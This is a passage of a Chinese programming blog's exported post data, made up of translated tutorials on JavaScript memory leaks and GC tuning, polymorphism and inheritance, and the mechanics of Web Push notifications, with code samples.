意外的全局变量的确是个问题，而代码经常会被显式定义的全局变量所污染，根据定义这些全局变量是不会被内存垃圾回收器所收集的。你需要特别注意的是使用全局变量来临时存储和处理大型的位信息。只有在必要的时候使用全局变量来存储数据，记得一旦你不再使用的时候，把它赋值为 null 或者对其再分配。 2：定时器及被遗忘的回调函数因为经常在 JavaScript 中使用 setInterval，所以让我们以它为例。 框架中提供了观察者和接受回调的其它指令通常会确保当他们的实例不可获得的时候，所有对回调的引用都会变成不可获得。很容易找到如下代码： 1234567var serverData = loadData();setInterval(function() { var renderer = document.getElementById('renderer'); if (renderer) { renderer.innerHTML = JSON.stringify(serverData); }}, 5000); // 这将会每隔大约 5 秒钟执行一次 以上代码片段展示了使用定时器来引用不再需要的节点或数据的后果。 renderer 对象会在某些时候被替换或移除，这样就会导致由定时处理程序封装的代码变得冗余。当这种情况发生的时候，不管是定时处理程序还是它的依赖都不会被垃圾回收，这是由于需要先停止定时器(记住，定时器仍然处于激活状态)。这可以归结为保存和处理数据加载的 serverData 变量也不会被垃圾回收。 当使用观察者的时候，你需要确保一旦你不再需要它们的时候显式地移除它们(不再需要观察者或者对象变得不可获得)。 幸运的是，大多数现代浏览器都会替你进行处理：当被观察者对象变得不可获得时，即使你忘记移除事件监听函数，浏览器也会自动回收观察者处理程序。以前，一些老掉牙的浏览器处理不了这些情况(如老旧的 IE6)。 那么，最佳实践是当对象被废弃的时候，移除观察者处理程序。查看如下例子： 123456789101112131415var element = document.getElementById('launch-button');var counter = 0;function onClick(event) { counter++; element.innerHTML = 'text' + counter;}element.addEventListener('click', onClick);// 一些操作element.removeEventListener('click', onClick);element.parentNode.removeChild(element);// 现在当元素超出范围// 即使在不能很好处理循环引用的浏览器中也会回收元素和 onClick 事件 在让一个 DOM 节点不可获得之前，你不再需要调用 removeEventListener，因为现代浏览器支持用内存垃圾回收器来检测并适当地处理 DOM 节点的生命周期。 如果你使用 jQuery API(其它的库和框架也支持的 API)，你可以在废弃节点之前移除事件监听函数。jQuery 也会确保即使在老旧的浏览器之中，也不会产生内存泄漏。 3. 闭包闭包是 JavaScript 的一个重要功能：嵌套函数可以访问外部(封闭)函数的变量。鉴于 JavaScript 运行时的实现细节，以下方法可能会造成内存泄漏： 12345678910111213141516var theThing = nullvar replaceThing = function () { var originalThing = theThing; var unused = function () { if (originalThing) // 引用 originalThing console.log(\"hi\"); }; theThing = { longStr: new Array(1000000).join('*'), someMethod: function () { console.log(\"message\"); } };};setInterval(replaceThing, 1000); 当调用 replaceThing 的时候，theThing 对象由一个大数组和新的闭包(someMethod)所组成。而 originalThing 由 unused 变量创建的闭包所引用(即引用 replaceThing 函数之前的 theThing 变量)。需要记住的是当一旦为同一个父作用域中的闭包创建闭包作用域的时候，该闭包作用域是共享的。 在这样的情况下，闭包 someMethod 和 unused 共享相同的作用域。unused 引用了 origintalThing。即使 unused 永不使用，也可以在 replaceThing 的作用域外使用 someMethod 函数。然后由于 someMethod 和 unused 共享相同的闭包作用域，unused 变量引用 originalThing 会强迫 unused 保持激活状态(两个闭包共享作用域)。这会阻止内存垃圾回收。 在以上例子中，闭包 someMethod 和 unused 共享作用域，而 unused 引用 origintalThing。可以在 replaceThing 作用域外通过 theThing 使用 someMethod，即使 unused 从未被使用。事实上，由于 someMethod 和 unused 共享闭包作用域，unused 引用 origintalThing 要求 unused 保持激活状态。 所有的这些行为会导致内存泄漏。当你不断地运行如上代码片段，你将会发现飙升的内存使用率。当内存垃圾回收器运行的时候，这些内存使用率不会下降。这里会创建出一份闭包链表(当前情况下，其根变量是 theThing)，每个闭包作用域都间接引用了大数组。 该问题是由 Metor 小组发现的并且他们写了一篇很好的文章来详细描述该问题。 4: 源自 DOM 引用有时候，开发者会在数据结构中存储 DOM 节点。 假设你想要快速更新几行表格内容。如果你在一个字典或者数组中保存对每个表格行的引用，这将会造成重复引用相同的 DOM 元素：一个在 DOM 树中而另一个在字典中。如果你想要释放对这些表格行的引用，你需要记得让这些引用变成不可获得。 123456789101112131415var elements = { button: document.getElementById('button'), image: document.getElementById('image')};function doStuff() { elements.image.src = 'http://example.com/image_name.png';}function removeImage() { // image 元素是 body 元素的直系后代元素 document.body.removeChild(document.getElementById('image')); // 这时，我们仍然在 elements 全局对象中引用了 #button 元素 // 换句话说，按钮元素仍然在内存中且不能够被垃圾回收器收集} 你还需要额外考虑的情况是引用 DOM 树中的内节点或者叶节点。如果你在代码中保存着对一个单元格的引用，这时候当你决定从 DOM 中移除表格，却仍然会保持对该单元格的引用，这就会导致大量的内存泄漏。你可以认为内存垃圾回收器将会释放除了该单元格以外的内存。而这还没完。因为单元格是表格的一个后代元素而后代元素保存着对其父节点的引用，对一个单元格的引用会导致无法释放整个表格所占用的内存。 内存管理心得以下内容为博主原创分享。By 三月。 指导思想尽可能减少内存占用，尽可能减少 GC。 减少 GC 次数 浏览器会不定时回收垃圾内存，称为 GC，不定时触发，一般在向浏览器申请新内存时，浏览器会检测是否到达一个临界值再进行触发。一般来说，GC 会较为耗时，GC 触发时可能会导致页面卡顿及丢帧。故我们要尽可能避免GC的触发。GC 无法通过代码触发，但部分浏览器如 Chrome，可在 DevTools -&gt; TimeLine 页面手动点击 CollectGarbage 按钮触发 GC。 减少内存占用 降低内存占用，可避免内存占用过多导致的应用/系统卡顿，App 闪退等，在移动端尤为明显。当内存消耗较多时，浏览器可能会频繁触发 GC。而如前所述，GC 发生在申请新内存时，若能避免申请新内存，则可避免GC 触发。 优化方案使用对象池 对象池（英语：object pool pattern）是一种设计模式。一个对象池包含一组已经初始化过且可以使用的对象，而可以在有需求时创建和销毁对象。池的用户可以从池子中取得对象，对其进行操作处理，并在不需要时归还给池子而非直接销毁它。这是一种特殊的工厂对象。 若初始化、实例化的代价高，且有需求需要经常实例化，但每次实例化的数量较少的情况下，使用对象池可以获得显著的效能提升。从池子中取得对象的时间是可预测的，但新建一个实例所需的时间是不确定。 以上摘自维基百科。 使用对象池技术能显著优化需频繁创建对象时的内存消耗，但建议按不同使用场景做以下细微优化。 按需创建 默认创建空对象池，按需创建对象，用完归还池子。 预创建对象 如在高频操作下，如滚动事件、TouchMove事件、resize事件、for 循环内部等频繁创建对象，则可能会触发GC的发生。故在特殊情况下，可优化为提前创建对象放入池子。 高频情况下，建议使用截流/防抖及任务队列相关技术。 定时释放 对象池内的对象不会被垃圾回收，若极端情况下创建了大量对象回收进池子却不释放只会适得其反。 故池子需设计定时/定量释放对象机制，如以已用容量/最大容量/池子使用时间等参数来定时释放对象。 其他优化tips 尽可能避免创建对象，非必要情况下避免调用会创建对象的方法，如 Array.slice、Array.map、Array.filter、字符串相加、$('div')、ArrayBuffer.slice 等。 不再使用的对象，手动赋为 null，可避免循环引用等问题。 使用 Weakmap 生产环境勿用 console.log 大对象，包括 DOM、大数组、ImageData、ArrayBuffer 等。因为 console.log 的对象不会被垃圾回收。详见Will console.log prevent garbage collection?。 合理设计页面，按需创建对象/渲染页面/加载图片等。 避免如下问题： 为了省事儿，一次性请求全部数据。 为了省事儿，一次性渲染全部数据，再做隐藏。 为了省事儿，一次性加载/渲染全部图片。 使用重复 DOM 等，如重复使用同一个弹窗而非创建多个。 如 Vue-Element 框架中，PopOver/Tooltip 等组件用于表格内时会创建 m * n 个实例，可优化为只创建一个实例，动态设置位置及数据。 ImageData 对象是 JS 内存杀手，避免重复创建 ImageData 对象。 重复使用 ArrayBuffer。 压缩图片、按需加载图片、按需渲染图片，使用恰当的图片尺寸、图片格式，如 WebP 格式。 图片处理优化假设渲染一张 100KB 大小，300x500 的透明图片，粗略的可分为三个过程： 加载图片 加载图片二进制格式到内存中并缓存，此时消耗了100KB 内存 &amp; 100KB 缓存。 解码图片 将二进制格式解码为像素格式，此时占用宽 * 高 * 24（透明为32位）比特大小的内存,即 300 * 500 * 32，约等于 585 KB，这里约定名为像素格式内存。个人猜测此时浏览器会回收加载图片时创建的 100KB 内存。 渲染图片 通过 CPU 或 GPU 渲染图片，若为 GPU 渲染，则还需上传到 GPU 显存，该过程较为耗时，由图片尺寸 / 显存位宽决定，图片尺寸越大，上传时间越慢，占用显存越多。 其中，较旧的浏览器如Firefox回收像素内存时机较晚，若渲染了大量图片时会内存占用过高。 PS：浏览器会复用同一份图片二进制内存及像素格式内存，浏览器渲染图片会按以下顺序去获取数据： 显存 &gt;&gt; 像素格式内存 &gt;&gt; 二进制内存 &gt;&gt; 缓存 &gt;&gt; 从服务器获取。我们需控制和优化的是二进制内存及像素内存的大小及回收。 总结一下，浏览器渲染图片时所消耗内存由图片文件大小内存、宽高、透明度等所决定，故建议： 使用 CSS3、SVG、IconFont、Canvas 替代图片。展示大量图片的页面，建议使用 Canvas 渲染而非直接使用img标签。具体详见 Javascript的Image对象、图像渲染与浏览器内存两三事。 适当压缩图片，可减小带宽消耗及图片内存占用。 使用恰当的图片尺寸，即响应式图片，为不同终端输出不同尺寸图片，勿使用原图缩小代替 ICON 等，比如一些图片服务如 OSS。 使用恰当的图片格式，如使用WebP格式等。详细图片格式对比，使用场景等建议查看web前端图片极限优化策略。 按需加载及按需渲染图片。 预加载图片时，切记要将 img 对象赋为 null，否则会导致图片内存无法释放。 当实际渲染图片时，浏览器会从缓存中再次读取。 将离屏 img 对象赋为 null，src 赋为 null，督促浏览器及时回收内存及像素格式内存。 将非可视区域图片移除，需要时再次渲染。和按需渲染结合时实现很简单，切换 src 与 v-src 即可。 参考链接：garbage-collector-friendly-code/ 移动 WEB 通用优化策略介绍（二） H5前端性能优化高级进阶 Javascript的Image对象、图像渲染与浏览器内存两三事 web前端图片极限优化策略 MDN Weakmap 函数节流、函数防抖实现原理分析 a-tour-of-v8-garbage-collection","link":"/posts/5ba3987d.html"},{"title":"3 种多态","text":"How JavaScript works: 3 types of polymorphism 原文请查阅这里 现实生活中，一个女人同时拥有不同的角色。她可以同时是母亲，雇员和妻子。她可以根据当前角色执行不同职能。这就是多态的概念，可以根据不同实例执行不同操作。 尽管很多人不清楚什么是多态，它在 JavaScript 中的工作原理以及其使用场景，但多态在编程中很重要；它是面向对象编程的核心特性。举个例子，当女性的角色是公司雇员时，她不太可能表现出在家中母亲的特征，反之亦然。 对于 Rust 这样的面向数据的语言，多态也是基于实体组件系统（ECS）实现的重要特性。编程语言可以为几种不同的基础数据类型提供相同的接口。用 JavaScript 编写程序可以采用不同的形式。在本文中，我们将探讨什么是多态，如何将其应用于 JavaScript ，不同类型的多态以及在使用多态时的注意事项。 什么是多态假设我们需要编写一个程序来计算形状的面积和周长。为此，我们需要定义一些方法来计算形状的面积和周长- area() 和 perimeter()。但基本几何学知识告诉我们，我们无法用相同的方式求解不同形状的面积和周长。例如，圆的周长是 2 x Pi x 半径，而正方形的周长是 4 x Length。 因此我们需要将不同的形状定义为基类 shape 的子类或派生类。所以将有一个圆形 circle，正方形square，梯形 trapezium，多边形 polygon 的子类，它们有各自的方法和不同的参数。上面的例子正是多态。现在shape 类具有不同的形态和特征 - 圆形，正方形，梯形和多边形。 多态是从两个词衍生而来 - poly 和 morphism 表示形式的多样。在编程中，多态被定义为一个对象采取不同形式的能力。在下一节，我们将深入了解 JavaScript 如何处理多态。 JavaScript 处理多态编程语言实现多态的方式不同。例如 Java 和 JavaScript(语法糖) 都是面向对象的语言，但它们处理多态的方式不同。尽管多态性是面向对象编程语言的核心功能，但是某些面向数据的语言通过实体组件系统（ECS）模式实现了多态。我们还将研究多态如何与继承和封装一起使用。 多态和面向对象编程要了解多态在面向对象程序设计中的工作原理，最好先了解面向对象模型的概念。面向对象模型依赖于对象和类的概念。这种类型的模型可以使用 this 或 self 的概念来改变其数据字段。 尽管这不在本文讨论范围内，但我将通过比较面向对象模型中的多态（作为接口）和面向数据编程中的多态（作为实体组件系统）来说明 JavaScript 中多态是如何工作的。 在面向对象中，我们可以创建一个类，使用以下代码块来计算不同形状的面积和周长： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class Shape { area() { return 0; } perimeter() { return 0; } toString() { return Object.getPrototypeOf(this).constructor.name; }}class Circle extends Shape { constructor(r) { super(); this.radius = r; } area() { return Math.PI * this.radius ** 2; } perimeter() { return Math.PI * this.radius * 2; }}class Rectangle extends Shape { constructor(w, h) { super(); this.width = w; this.height = h; } area() { return this.width * this.height; } perimeter() { return 2 * (this.width + this.height); }}function cumulateShapes(shapes) { return shapes.reduce((sum, shape) =&gt; { if (shape instanceof Shape) { console.log(`Shape: ${shape.toString()} - area: ${shape.area()}`); console.log( `Shape: ${shape.toString()} - perimeter: ${shape.perimeter()}` ); return sum + shape.area(); } throw Error(\"Bad argument shape.\"); }, 0);}const shapes = [new Circle(3), new Rectangle(2, 3)];console.log(cumulateShapes(shapes));// Shape: Circle - area: 28.274333882308138// Shape: Circle - perimter: 18.84955592153876// Shape: Rectangle - area: 6// Shape: Rectangle - perimter: 10 我们可以使用面向数据语言的伪代码从上面的代码中使用ECS 重新创建程序。 123456789101112131415161718192021222324var Position;var Circle;var Rectangle;class CirlceSystem extends Position { OnUpdate() { ComponentQuery.SelectReadOnly(typeof Position, typeof Circle).ForEachEntity( (Entity, Position, Circle) =&gt; { /* find area and perimeter */ } ); }}class RectangleSystem extends Position { OnUpdate() { ComponentQuery.SelectReadOnly( typeof Position, typeof Rectangle ).ForEachEntity((entity, Position, Rectangle) =&gt; { /* find area and perimeter */ }); }} 两个例子的区别在于，在 JavaScript 代码的面向对象编程中，使用了接口/抽象的方式进行深度继承。但在面向数据编程的伪代码中我们使用 ECS 模型将实体分离为组件便于数据检索。 多态与继承继承是面向对象编程中多态性的重要特性。让我们看一个 car 对象的例子: 123456class Car { constructor(color, speed) { this._speed = speed; this._color = color; }} 现在汽车对象将针对不同的汽车制造商（例如宝马，丰田，宾利等）创建不同的子类，以及不同的属性（例如颜色和速度）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class BMW extends Car { constructor(color, speed, make) { super(color, speed); this._make = make; } showInfo() { console.log( \"I’m \" + this._make + \", my color is \" + this._color + \", and my speed is \" + this._speed ); }}class Toyota extends Car { constructor(color, speed, make) { super(color, speed); this._make = make; } showInfo() { console.log( \"I’m \" + this._make + \", my color is \" + this._color + \", and my speed is \" + this._speed ); }}class Bentely extends Car { constructor(color, speed, make) { super(color, speed); this._make = make; } showInfo() { console.log( \"I’m \" + this._make + \", my color is \" + this._color + \", and my speed is \" + this._speed ); }} 接下来，我们为不同车型输入颜色，速度并打印信息。 123456var myBentely = new Bentely('Red', '20mph', 'Bentely');var myBMW = new BMW('Green', '40mph', 'BMW');var myToyota = new Toyota('White', '60mph', 'Toyota');console.log(myBentely.showInfo()); console.log(myBMW.showInfo()); console.log(myToyota.showInfo()); 在示例中，子类可以使用超类的属性来对其进行定义。继承可以从当前家庭追溯到祖父母甚至曾祖父母。 JavaScript 中不同类型的继承继承是 JavaScript 中一个非常广泛的主题，因为其实现方式有多种 - 如原型，伪类和函数式继承。让我们简要看一下它们的不同之处，以及如何与 JavaScript 多态一起使用。 原型继承 原型继承是一种继承类型，它向现有对象添加新的属性和方法。这种继承利用了原型对象，即 object.prototype。 123456789101112let Car = { color: \"Red\",};let BMW = { make: \"BMW\",};BMW.__proto__ = Car;// we can find both properties in BMW now:console.log(\"This is a \" + BMW.color + \" \" + BMW.make);//# This is a Red BMW 伪类继承 伪类继承与原型继承类似，这种类型的继承使用原型继承来模拟类继承。但是如果使用 ES6 编程，则不建议使用伪类继承，因为您可以使用传统的类（class 关键字）。在伪类继承中，我们尝试用 new 关键字调用的函数创建一个类。为了帮助更好地理解我们将使用我们的汽车示例。假设我们有一个汽车对象，如下代码所示： 12345function Car(make, color, speed) { this.make = make; this.color = color; this.speed = speed;} 我们可以使用 new 关键字创建具有原型的对象的不同汽车子类： 123var Toyota = new Car (\"Toyota\", \"Red\", \"100mph\");var Bentley = new Car (\"Bentley\", \"White\", \"120mph\");var BMW = new Car (\"BMW\", \"Green\", \"90mph\"); 接下来，我们将了解如何将原型作为继承传递，以及它如何影响多态。首先，我们将创建一个 dialogue 函数，我们希望汽车对象继承该函数： 123function dialogue() { console.log('I am ' + this.make);} 之后，我们将允许汽车用原型来继承dialogue 函数： 1234567891011121314Car.prototype.dialogue = function () { console.log( \"I am a \" + this.color + \" \" + this.make + \" with \" + this.speed + \" speed \" );};console.log(Toyota.dialogue());console.log(BMW.dialogue());console.log(Bentley.dialogue()); 上面的程序会在控制台分别输出 I am a red Toyota with 100mph speed，I am a green BMW with 90mph speed 和 I am a white Bentley with 120mph speed。 函数式继承 函数式继承涉及通过对对象实例使用增强函数来继承特征。 1234567891011121314151617function Person(data) { var that = {}; that.name = data.name; return that;}// Create a child object, to inherit from the base Personfunction Employee(data) { var that = Person(data); that.sayHello = function () { return \"Hello, I'm \" + that.name; }; return that;}var myEmployee = Employee({ name: \"Rufi\" });console.log(myEmployee.sayHello()); 多态与封装 上面的内容可以帮助我们对理解多态中的继承的工作方式，因此更容易理解在多态中的封装。进行编程时，有时需要将数据捆绑在一起，使用户无法从外部访问特定对象的变量的状态值。 在下面示例中，我们通过绑定学生数据并使用基于原型的多态继承它们来验证学生成绩。 1234567891011121314151617181920212223function Student(name, marks) { var student_name = name; var student_marks = marks; Object.defineProperty(this, \"name\", { get: function () { return student_name; }, set: function (student_name) { this.student_name = student_name; }, }); Object.defineProperty(this, \"marks\", { get: function () { return student_marks; }, set: function (student_marks) { this.student_marks = student_marks; }, });}var stud = new Student(\"Mercy's score is: \", 60);console.log(stud.name + \" \" + stud.marks); 这是一个很好的示例，可以了解 JavaScript 中的封装和多态。 许多人不了解抽象和封装的区别。在抽象里仅显示某些特定信息，而其余的则被隐藏。而在封装中，数据被绑定至单个实体，并且对外部而言是隐藏的。使用封装的主要原因是控制和验证数据。就像上面例子，对学生成绩的验证是在确保学生/公众无法干预的方式进行的。 多态的种类JavaScript 中有多种类型的多态。本节我们将讨论特设（ad-hoc），子类型（Sub-type）和参数多态（parametric polymorphism）这三种主要类型。 ### 特设多态 特设多态是一种当以不同类型观测时，值可以表现出不同行为的多态。特设多态涉及具有不同形态但名称相同的函数。 这种多态通常称为重载。让我们来看一种称为操作符重载的特设多态。 操作符重载125 + 5; // will print 10'I am' + ' ' + '5 years old' // will print I am 5 years old 在上面的示例中，运算符 + 执行了加法和字符串连接的不同操作。 参数式多态参数多态是一种处理通用函数和通用数据类型，同时仍保持静态类型安全性的多态。通用函数和数据类型是可以以某种方式编写的函数或数据类型，以便类似地处理值而无需根据其类型对它们进行分类。 例如，对象可以存储不同的数据类型,它不会根据其类型来区分值： 123456const Ann = { firstName: 'Ann', lastName: 'Kim', Age: 4, Adult: false} 上面代码中有一个对象 Ann。该对象包含名字和姓氏（字符串），年龄（是数字）和布尔值（表明Ann不是成年人）。尽管对象中有不同的数据类型，但是对象对它们的处理方式没有差别。 另一个简单例子是数组。在 JavaScript 中，数组元素可以是不同数据类型。 const Ann = [‘Ann’, ‘Kim’, 4, false]; 让我们再看一个例子，参数 id 不会根据值类型来区分数字 1 和字符串 foo。 123const id = (x) =&gt; x;id(1); // 1id(\"foo\"); // \"foo\" 子类型多态子类型多态涉及一个子类型和一个超类数据类型。这种多态不应与继承相混淆，因为它不涉及从现对象中创建新对象，即使 JavaScript 中这种类型的多态大多数情况下都使用继承实现。而应该这么理解，子类型多态是关于一个接口替换成不同的实现。 比如一位亲戚不幸去世，而你继承了他的书店。你可以阅读那里的所有书籍，可以把书籍卖掉，还可以查看已故者的帐户，已故的客户列表等。你拥有该亲戚拥有的一切。继承是代码复用的一种方式。 如果亲戚没有在遗嘱中把书店留给你，则你可以重新开张书店，承担亲戚所有角色和职责，甚至添加一些自己的改变-分型；现在你是一家书店老板，就像你亲戚之前一样。 先来看一下代码： 123456789function Animal () {}Animal cat = new Cat (\"Kitty\");Animal Dog = new Cat (\"puppy\");Animal cat = new Cat (\"Kiddy\");// you can go ahead to create different properties for different animals 猫，狗和山羊是动物的子类型。动物可以是猫，狗或山羊等。你可以用不同的实现替换成不同动物。 JavaScript 多态处理的注意事项我们在本文中简要地探讨了多态，本节将指出在处理 JavaScript 多态时要的一些注意事项。 多态函数会影响代码的性能，即程序的运行速度。比如单态函数将比多态函数运行得更快。在某些情况下，如果函数运行的频率较高，则性能差异可以忽略不计。 有时多态会降低程序的可读性。要解决此问题，代码注释很关键，这样开发者可以更好识别程序的运行时行为。 为了在 JavaScript 中轻松实现多态需要了解继承。这是因为 JavaScript 中的多态是围绕继承进行的。 为何使用多态对于多数 JavaScript 开发者而言代码复用性的必要的。这是多态的特征之一。先前编写的代码可以重复使用。例如，超类 Perosn 可以被子类 employee 继承。另一个原因是能够将不同数据类型的值存储在一起比如前面提到的数组例子。 同样，多态也带来了从简单抽象组合成复杂抽象的能力。 在不关心性能的项目中，是否使用多态主要取决于使代码更具扩展性和可维护性的方法。","link":"/posts/9fcc23ec.html"},{"title":"网页消息推送通知机制","text":"How JavaScript works: the mechanics of Web Push Notifications 原文请查阅这里，略有删减。 这次让我们把注意力转移到网页推送通知：我们将查看其组成，探索发送／接收通知背后的过程以及最后分享一下我们在 SessionStack 是如何计划利用这些功能来创建新产品功能。 推送通知这一功能在移动端已经非常普遍。不知为何，即使大多数开发者强烈地要求实现这一功能，网页端的消息推送依然姗姗来迟。 概述网页推送通知允许用户选择定时从网络应用获取及时信息。旨在为用户重新获取其感兴趣，重要和及时的信息。 推送服务是基于 Service Workers 的，在上一章中有详细阐述过。 这个情况下，之所以采用 Service Workers 是因为它会在后台运行，不会阻塞界面的渲染。对于推送通知来说，这点相当重要，因为这意味着只有当用户和推送通知本身进行交互操作才会执行推送通知的相关代码。 消息推送和通知消息推送和通知是两个不同的接口。 消息推送－消息推送服务器向Service Worker 推送消息时调用。 消息通知－网络应用中的Service Worker 或者脚本进行操作向用户显示消息通知。 消息推送实现消息推送大概有以下三个步骤： UI 界面－添加客户端逻辑来让用户订阅推送服务。在网络应用界面中书写 JavaScript 代码逻辑来让用户注册消息推送服务。 发送推送消息－在服务器端实现接口调用来触发向用户设备推送消息。 接收推送消息－一旦在浏览器端接收到推送消息则处理之。 现在，让我们详细阐述整个过程。 兼容性检测首先，需要检测当前浏览器是否支持消息推送服务。可以采用以下两种简单的检查： 检测 navigator 对象上的 serviceWorker 属性 检测 window 对象上的 PushManager 属性 检测代码如下： 123456789if (!('serviceWorker' in navigator)) { // 当前浏览器不支持服务器工作线程，禁用或者隐藏界面 return; }if (!('PushManager' in window)) { // 当前浏览器不支持推送服务，禁用或者隐藏界面 return; } Service Worker 注册此使我们知道浏览器支持消息推送功能。下一步就是注册我们的 Service Worker。 请求授权当注册 Service Worker 之后，接下来进行用户订阅的相关操作。这需要获得用户的授权来向其推送消息。 获得授权的接口相当简单但有一个缺点即接口 接受的参数以前是一个回调函数现在是一个 Promise。因为无法知晓当前浏览器支持的接口版本，所以需要进行兼容处理。如下： 1234567891011121314151617function requestPermission() { return new Promise(function(resolve, reject) { const permissionResult = Notification.requestPermission(function(result) { // 使用回调来处理废弃的接口版本 resolve(result); }); if (permissionResult) { permissionResult.then(resolve, reject); } }) .then(function(permissionResult) { if (permissionResult !== 'granted') { throw new Error('Permission not granted.'); } });} 调用 Notification.requestPermission() 会向用户弹出以下的提示框： 当获得，关闭以及禁止权限的时，就可以得到 granted，default 或者 denied 的结果字符串。 需要注意的是当用户点击 禁止 按钮，网络应用将不会再次询问用户授权直到用户手动开启更改授权状态。该选项将已知隐藏于设置面板中。 点击地址栏最左边的信息按钮即可弹出授权的弹窗。 通过 PushManager 订阅用户一旦 Service Worker 注册成功且获得授权，就可以在注册服务器线程的时候通过调用 registration.pushManager.subscribe() 来订阅用户。 整个代码片段如下（包括注册 Service Worker ）： 1234567891011121314151617function subscribeUserToPush() { return navigator.serviceWorker.register('service-worker.js') .then(function(registration) { var subscribeOptions = { userVisibleOnly: true, applicationServerKey: btoa( 'BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5Nksh8U' ) }; return registration.pushManager.subscribe(subscribeOptions); }) .then(function(pushSubscription) { console.log('PushSubscription: ', JSON.stringify(pushSubscription)); return pushSubscription; });} registration.pushManager.subscribe(options） 中有一个 options 对象参数，其中包含有必选和可选的参数： userVisibleOnly：返回的推送订阅是否仅对订阅用户可见。必须设置为 true 否则会出错（这是历史原因造成的）。 applicationServerKey：一个包含公钥的 Base64 编码的 DOMString 字符串或者 ArrayBuffer ，是消息推送服务器用来验证应用服务器。 消息推送服务器需要生成一对应用服务器密钥对－即VAPID密钥对，这对于消息推送服务器来说是唯一的。它们是由一对公钥和私钥所组成。私钥秘密存储于推送服务器端，公钥用来和客户端进行交换通讯用的。这些密钥让推送服务辨别订阅用户的应用服务器以及确保触发推送消息到指定用户的是同一个应用服务器。 你只需要生成应用程序私有/公有密钥对一次。可以访问 https://web-push-codelab.glitch.me/ 生成密钥对。 当订阅用户的时候，浏览器向推送服务传入 applicationServerKey (公钥)，意即推送服务把应用服务器公钥和用户的 PushSubscription 绑定在一起。 过程如下： 网络应用加载完成后调用 subscribe() ，传入服务器公钥。 浏览器向消息推送服务发起请求生成一个端点信息并连同密钥信息一起返回给浏览器。 浏览器把端信息添加到由 subscribe() promise 所返回的 PushSubscription 对象中。 之后，每当需要推送信息的时候，必须发送包含应用服务器私钥签名的信息一个认证头。 每当推送服务接收到推送消息请求，它会通过在传输头中查找已经和指定端（第二步中）绑定的公钥来进行验证。 PushSubscription 对象PushSubscription 包含了向用户设备推送信息所必备的一切信息。大概包含如下信息： 12345678{ \"endpoint\": \"https://domain.pushservice.com/some-id\", \"keys\": { \"p256dh\":\"BIPUL12DLfytvTajnryr3PJdAgXS3HGMlLqndGcJGabyhHheJYlNGCeXl1dn18gSJ1WArAPIxr4gK0_dQds4yiI=\", \"auth\":\"FPssMOQPmLmXWmdSTdbKVw==\" }} endpoint 即是推送服务地址。当需要推送消息时，向该地址发起 POST 请求。 keys 对象包含用来加密随推送消息一起发送的信息数据的值。 当用户订阅之后且返回了 PushSubscription 对象，你需要把它保存在推送服务器上。这样就可以把该订阅相关数据保存在数据库之中然后从今以后，就可以根据数据库中的存储值来给指定的用户发送消息。 消息推送当需要发送消息到用户的时候，首先需要有一个消息推送服务。你通知推送服务（通过接口调用）需要推送的数据，消息推送的目标用户以及任意条件下如何发送消息。一般情况下，这些接口调用是由消息推送服务器来完成的。 消息推送服务消息推送服务是用来接收消息推送请求，验证请求以及推送消息到指定的用户浏览器端。 请注意这里的消息推送服务并不是由你来控制的－它是第三方服务。服务器只是通过接口来和消息推送服务进行通讯。Google’s FCM 是商业消息推送服务的一个例子。 消息推送服务会处理核心的事务。比如，当浏览器离线，推送服务会将先前发送的消息组成消息队列且等待直到浏览器连网。 开发人员可以选择让浏览器使用任意的消息推送服务，这属于程序员不可控的环节。 然而，所有的消息推送服务都拥有一样的接口，这样就不会因为接口不一致而增加消息推送实现的难度。 可以从 PushSubscription 对象的 endpoint 属性值获得处理消息推送的请求 URL 地址。 消息推送接口消息推送服务接口提供了向用户发送消息的一种方法。该接口是一个被称为 Web Push Protocol 的 IETF 标准协议，里面定义了如何调用消息推送服务。 推送消息必须经过加密。这样可以防止消息推送服务窥视到发送的数据。这是至关重要的因为客户端可以决定使用哪个消息推送服务（可能会使用一些不被信任和不安全的消息推送服务）。 消息推送参数： TTL－定义消息在被删除且不能够传输之前在队列中的保存时长。 Priority－定义了每条消息的优先级，这样就可以让消息推送服务只推送高优先级的消息以方便用户节省设备的电力。 Topic－为推送消息设置主题名称这样就可以使用相同的主题名称来置换掉挂起的消息，所以一旦设备激活，用户就不会收到过期的消息。 浏览器消息推送事件每当发送消息到如上的推送服务，消息会处于待发送状态直到发生以下几种情况： 设备连网。 队列中的消息停留时长超过设置的 TTL。 当消息推送服务传输消息到浏览器，浏览器会接收到，解密，然后在 Service Worker 中分发 push 事件。 划重点这里即使没有打开网页，浏览器仍然可以执行Service Worker 。会发生如下事件： 浏览器解密接收的推送消息。 浏览器唤醒 Service Worker 。 Service Worker 接收到 push 事件。 监听推送事件和在 JavaScript 中写的其它事件监听非常类似。 1234567self.addEventListener('push', function(event) { if (event.data) { console.log('This push event has data: ', event.data.text()); } else { console.log('This push event has no data.'); }}); 需要理解Service Worker 的一点即其运行时间是不可人为控制的。只有浏览器可以唤醒和结束它。 在 Service Worker 中，event.waitUntil(promise) 告诉浏览器 Service Worker 正在处理消息直到 promise 解析完成，如果想要完成消息的处理，那么浏览器就不应该中止 Service Worker 。 以下为处理 push 事件的示例： 12345self.addEventListener('push', function(event) { var promise = self.registration.showNotification('Push notification!'); event.waitUntil(promise);}); 调用 self.registration.showNotification() 向用户弹出一个通知并且返回一个 promise，一旦通知显示完成即解析完成。 可以采用可视化的方法来设置符合自己需求的 showNotification(title, options) 方法。title 参数是字符串而 options 是一个类似如下的对象： 1234567891011121314151617181920212223{ \"//\": \"视觉选项\", \"body\": \"&lt;String&gt;\", \"icon\": \"&lt;URL String&gt;\", \"image\": \"&lt;URL String&gt;\", \"badge\": \"&lt;URL String&gt;\", \"vibrate\": \"&lt;Array of Integers&gt;\", \"sound\": \"&lt;URL String&gt;\", \"dir\": \"&lt;String of 'auto' | 'ltr' | 'rtl'&gt;\", \"//\": \"行为选项\", \"tag\": \"&lt;String&gt;\", \"data\": \"&lt;Anything&gt;\", \"requireInteraction\": \"&lt;boolean&gt;\", \"renotify\": \"&lt;Boolean&gt;\", \"silent\": \"&lt;Boolean&gt;\", \"//\": \"视觉和行为选项\", \"actions\": \"&lt;Array of Strings&gt;\", \"//\": \"信息选项。没有视觉效果\", \"timestamp\": \"&lt;Long&gt;\"} 这里查看到每个选项的更加详细的内容。 